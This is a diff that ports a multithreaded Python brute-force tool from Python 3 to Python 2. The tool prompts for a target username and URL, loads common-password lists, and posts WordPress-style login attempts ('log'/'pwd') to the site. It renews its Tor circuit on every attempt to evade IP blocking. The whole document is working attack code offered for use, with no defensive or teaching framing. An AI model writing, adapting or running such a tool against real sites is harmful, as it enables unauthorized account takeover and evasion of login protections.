@@ -1,10 +1,10 @@
 from colorama import Fore, Back, Style
-import queue
+import Queue
 import threading
 from splinter import Browser
 import selenium
 from TorCtl import TorCtl
-import urllib
+import urllib, urllib2
 
 exitFlag = 0
 
@@ -38,9 +38,9 @@ def process_data(threadName, q):
 			queueLock.release()
 			set_url_proxy()
 			renew_connection()
-			payload = {"log" : username, "pwd" : password}
-			data = bytes(urllib.parse.urlencode(payload).encode())
-			request = urllib.request.urlopen(url, data)
+			payload = urllib.urlencode({"log" : username, "pwd" : password})
+			req = urllib2.Request(url, payload)
+			request = urllib2.urlopen(req)
 			page = request.read().decode("utf-8")	
 			if "ERROR" in page:
 				print(Fore.WHITE + Back.RED + Style.BRIGHT  + "Incorrect password: " + password + Style.RESET_ALL)
@@ -51,7 +51,7 @@ def process_data(threadName, q):
 			queueLock.release()
 
 password_list = []
-password_location = str(input("What password list would you like to use?\nFor top 100 list type '1', for top 1000 list type '2'\nFor your own list, type the path to your list.\n"))
+password_location = str(raw_input("What password list would you like to use?\nFor top 100 list type '1', for top 1000 list type '2'\nFor your own list, type the path to your list.\n"))
 
 if password_location == "1":
 	browser = Browser("phantomjs")
@@ -73,13 +73,13 @@ else:
 		newline = line.rstrip()
 		password_list.append(newline)
 
-username = str(input("What username should we target? "))
-url = str(input("What url should we target? "))
+username = str(raw_input("What username should we target? "))
+url = str(raw_input("What url should we target? "))
 headers = {'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"}
 
 threadList = ["Thread-1", "Thread-2", "Thread-3", "Thread-4", "Thread-5", "Thread-6"]
 queueLock = threading.Lock()
-workQueue = queue.Queue(len(password_list))
+workQueue = Queue.Queue(len(password_list))
 threads = []
 threadID = 1
 
